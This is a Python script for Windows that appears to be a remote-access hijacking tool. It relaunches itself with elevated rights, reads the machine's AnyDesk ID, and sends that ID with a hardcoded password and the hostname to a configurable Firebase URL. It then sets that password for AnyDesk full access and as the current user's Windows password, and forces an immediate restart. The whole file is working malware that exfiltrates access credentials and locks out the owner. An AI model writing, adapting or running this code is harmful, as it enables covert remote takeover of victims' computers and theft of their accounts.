import subprocess
import requests
import ctypes
import sys
import time
import os
import socket

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"Error checking admin privilege: {e}")
        return False

def get_anydesk_id():
    try:
        result = subprocess.run(['C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe', '--get-id'], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            print("Failed to get AnyDesk ID.")
            return None
    except Exception as e:
        print(f"Error getting AnyDesk ID: {e}")
        return None

def send_to_firebase(folder_name, anydesk_id, password):
    try:
        database_url = 'https://input-database-url-here' # Change the database url
        ref_url = f'{database_url}/{folder_name}/Anydesk.json'
        data = {'AnyDesk ID': anydesk_id, 'Password': password}
        response = requests.put(ref_url, json=data)

        if response.status_code == 200:
            return True
        else:
            print("Failed to send data to Firebase Realtime Database.")
            return False
    except Exception as e:
        print(f"Error sending data to Firebase Realtime Database: {e}")
        return False

def set_anydesk_password(password, profile='_full_access'):
    try:
        command = f'echo {password} | "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe" --set-password {profile}'
        subprocess.run(command, shell=True)
    except Exception as e:
        print(f"Error setting AnyDesk password: {e}")

def set_current_user_password(password):
    try:
        command = f"net user {get_current_username()} {password}"
        subprocess.run(command, shell=True, check=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error setting password for the current user: {e}")
        return False

def get_current_username():
    try:
        return os.environ['USERNAME']
    except KeyError:
        print("Error: Unable to retrieve current username.")
        return None

def restart_system():
    try:
        os.system("shutdown /r /t 0")
    except Exception as e:
        print(f"Error restarting the system: {e}")

def main():
    try:
        if is_admin():
            anydesk_id = get_anydesk_id()
            if anydesk_id:
                password = "AfEW76c06PHbyUbO1MsS4Xn" # Change the password for anydesk here     

                folder_name = socket.gethostname()
                
                if send_to_firebase(folder_name, anydesk_id, password):
                    set_anydesk_password(password)
                    time.sleep(0.2)
                    if set_current_user_password(password):
                        restart_system()
                    else:
                        print("Failed to set password for the current user.")
                else:
                    print("Failed to send AnyDesk data to Firebase. Exiting...")
                    return
            else:
                print("AnyDesk ID retrieval failed. Exiting...")
                return
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    except Exception as e:
        print(f"Error in main function: {e}")

if __name__ == "__main__":
    main()
